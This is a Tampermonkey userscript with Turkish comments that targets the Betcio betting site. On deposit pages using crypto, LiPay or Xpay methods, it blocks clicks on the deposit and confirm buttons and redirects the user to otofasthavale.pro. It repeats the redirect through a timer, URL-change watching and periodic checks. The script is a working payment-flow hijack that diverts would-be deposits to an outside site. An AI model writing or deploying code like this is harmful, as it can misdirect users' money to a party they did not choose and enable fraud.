// ==UserScript==
// @name         Betcio Kripto → Otofast Yönlendirme
// @namespace    http://tampermonkey.net/
// @version      0.3
// @description  Deposit + kripto/LiPay/Xpay seçilirse otofasthavale.pro'ya yönlendir
// @author       You
// @match        *://*.betcio*/*
// @match        *://m.betcio*/*
// @match        *://betcio*/*
// @grant        none
// @run-at       document-end
// ==/UserScript==

(function() {
    'use strict';

    const KRIPTO_METHODS = [
        'lipay', 'xpay', 'kripto', 'kriptopay', 'crypto', 'usdt', 'btc', 'eth', 'tron'
    ].map(s => s.toLowerCase());

    function isKriptoDepositPage() {
        const url = window.location.href.toLowerCase();

        // 1. Deposit sayfası mı?
        if (!url.includes('page=deposit')) return false;

        // 2. Kripto ile ilgili parametre var mı?
        const params = new URLSearchParams(window.location.search);
        const method = params.get('selectedMethod')?.toLowerCase() || '';
        const group  = params.get('selectedGroup')?.toLowerCase() || '';

        // Direkt method kontrolü
        if (method && KRIPTO_METHODS.some(k => method.includes(k))) {
            return true;
        }

        // Bazen group kripto oluyor
        if (group && KRIPTO_METHODS.some(k => group.includes(k))) {
            return true;
        }

        // Ekstra: url'de kripto kelimesi geçiyorsa (nadir)
        return KRIPTO_METHODS.some(k => url.includes(k));
    }

    // Sayfa yüklendiğinde + dinamik değişimlerde kontrol
    function checkAndRedirect() {
        if (isKriptoDepositPage()) {
            console.log('[Kripto Tespit] → otofasthavale.pro yönlendirme AKTİF');

            // Buton varsa direkt engelle + yönlendir
            const buttons = document.querySelectorAll('button, [type="submit"], .deposit-button, [class*="confirm"], [class*="yatir"]');

            buttons.forEach(btn => {
                btn.addEventListener('click', function(e) {
                    e.preventDefault();
                    e.stopImmediatePropagation();
                    window.location.href = 'https://otofasthavale.pro';
                }, true);
            });

            // Buton yoksa direkt 1-2 sn sonra yönlendir (önlem)
            setTimeout(() => {
                if (document.querySelector('form') || document.querySelector('[class*="deposit"]')) {
                    window.location.href = 'https://otofasthavale.pro';
                }
            }, 1500);
        }
    }

    // İlk çalıştırma
    checkAndRedirect();

    // URL değişirse (single page app davranışı için)
    let lastUrl = location.href;
    new MutationObserver(() => {
        const urlNow = location.href;
        if (urlNow !== lastUrl) {
            lastUrl = urlNow;
            checkAndRedirect();
        }
    }).observe(document, {subtree: true, childList: true});

    // Ayrıca periyodik kontrol (dinamik yüklemeler için)
    setInterval(checkAndRedirect, 2000);

})();
